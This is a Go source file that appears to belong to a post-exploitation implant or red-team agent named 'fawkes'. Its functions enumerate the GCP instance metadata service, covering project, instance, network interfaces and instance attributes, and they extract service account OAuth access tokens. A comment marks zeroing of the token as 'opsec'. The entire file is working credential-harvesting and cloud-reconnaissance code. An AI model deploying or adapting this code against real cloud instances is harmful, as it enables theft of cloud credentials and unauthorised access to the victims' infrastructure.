package commands

import (
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// --- GCP ---

func gcpDumpAll(timeout time.Duration) string {
	var sb strings.Builder
	sb.WriteString("=== GCP Instance Metadata ===\n")
	h := map[string]string{"Metadata-Flavor": "Google"}

	items := []struct {
		label, path string
	}{
		{"Project ID", "project/project-id"},
		{"Numeric Project ID", "project/numeric-project-id"},
		{"Instance Name", "instance/name"},
		{"Instance ID", "instance/id"},
		{"Machine Type", "instance/machine-type"},
		{"Zone", "instance/zone"},
		{"Hostname", "instance/hostname"},
		{"CPU Platform", "instance/cpu-platform"},
		{"Image", "instance/image"},
		{"Tags", "instance/tags"},
	}

	for _, item := range items {
		if val := metadataGet(gcpMetadataBase+"/computeMetadata/v1/"+item.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("  %-22s %s\n", item.label+":", val))
		}
	}

	sb.WriteString("\n")
	sb.WriteString(gcpGetToken(timeout))
	sb.WriteString("\n")
	sb.WriteString(gcpGetUserdata(timeout))

	return sb.String()
}

func gcpGetToken(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	// List service accounts
	accts := metadataGet(gcpServiceAcctURL, timeout, h)
	if accts == "" {
		sb.WriteString("[*] GCP: No service accounts attached\n")
		return sb.String()
	}

	for _, acct := range strings.Split(accts, "\n") {
		acct = strings.TrimSpace(acct)
		if acct == "" {
			continue
		}
		sb.WriteString(fmt.Sprintf("[+] GCP Service Account: %s\n", acct))

		// Get email
		email := metadataGet(gcpServiceAcctURL+acct+"email", timeout, h)
		if email != "" {
			sb.WriteString(fmt.Sprintf("    Email: %s\n", email))
		}

		// Get scopes
		scopes := metadataGet(gcpServiceAcctURL+acct+"scopes", timeout, h)
		if scopes != "" {
			sb.WriteString(fmt.Sprintf("    Scopes: %s\n", strings.ReplaceAll(scopes, "\n", ", ")))
		}

		// Get token
		tokenResp := metadataGet(gcpServiceAcctURL+acct+"token", timeout, h)
		if tokenResp != "" {
			sb.WriteString(formatGCPTokenJSON(tokenResp))
			structs.ZeroString(&tokenResp) // opsec: clear GCP access token response
		}
	}
	return sb.String()
}

func gcpGetIdentity(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	sb.WriteString("[+] GCP Instance Identity:\n")
	for _, item := range []struct{ label, path string }{
		{"Name", "instance/name"},
		{"ID", "instance/id"},
		{"Zone", "instance/zone"},
		{"Machine Type", "instance/machine-type"},
		{"Project", "project/project-id"},
		{"Hostname", "instance/hostname"},
	} {
		if val := metadataGet(gcpMetadataBase+"/computeMetadata/v1/"+item.path, timeout, h); val != "" {
			sb.WriteString(fmt.Sprintf("    %-16s %s\n", item.label+":", val))
		}
	}
	return sb.String()
}

func gcpGetUserdata(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	// GCP stores user data in instance attributes
	ud := metadataGet(gcpMetadataBase+"/computeMetadata/v1/instance/attributes/", timeout, h)
	if ud == "" {
		sb.WriteString("[*] GCP: No instance attributes configured\n")
		return sb.String()
	}

	sb.WriteString("[+] GCP Instance Attributes:\n")
	for _, attr := range strings.Split(ud, "\n") {
		attr = strings.TrimSpace(attr)
		if attr == "" {
			continue
		}
		val := metadataGet(gcpMetadataBase+"/computeMetadata/v1/instance/attributes/"+attr, timeout, h)
		sb.WriteString(fmt.Sprintf("    %s: %s\n", attr, truncate(val, 500)))
	}
	return sb.String()
}

func gcpGetNetwork(timeout time.Duration) string {
	var sb strings.Builder
	h := map[string]string{"Metadata-Flavor": "Google"}

	sb.WriteString("[+] GCP Network:\n")

	// Get network interfaces
	ifaces := metadataGet(gcpMetadataBase+"/computeMetadata/v1/instance/network-interfaces/", timeout, h)
	if ifaces == "" {
		sb.WriteString("    No network interface info available\n")
		return sb.String()
	}

	for _, idx := range strings.Split(ifaces, "\n") {
		idx = strings.TrimSpace(idx)
		if idx == "" {
			continue
		}
		basePath := gcpMetadataBase + "/computeMetadata/v1/instance/network-interfaces/" + idx
		sb.WriteString(fmt.Sprintf("  Interface %s\n", strings.TrimSuffix(idx, "/")))
		for _, item := range []struct{ label, sub string }{
			{"IP", "ip"},
			{"Network", "network"},
			{"Subnetwork", "subnetwork"},
			{"Gateway", "gateway"},
			{"MAC", "mac"},
		} {
			if val := metadataGet(basePath+item.sub, timeout, h); val != "" {
				sb.WriteString(fmt.Sprintf("    %-14s %s\n", item.label+":", val))
			}
		}

		// Access configs (external IP)
		acIdx := metadataGet(basePath+"access-configs/", timeout, h)
		if acIdx != "" {
			for _, ac := range strings.Split(acIdx, "\n") {
				ac = strings.TrimSpace(ac)
				if ac == "" {
					continue
				}
				if extIP := metadataGet(basePath+"access-configs/"+ac+"external-ip", timeout, h); extIP != "" {
					sb.WriteString(fmt.Sprintf("    External IP:   %s\n", extIP))
				}
			}
		}
	}
	return sb.String()
}
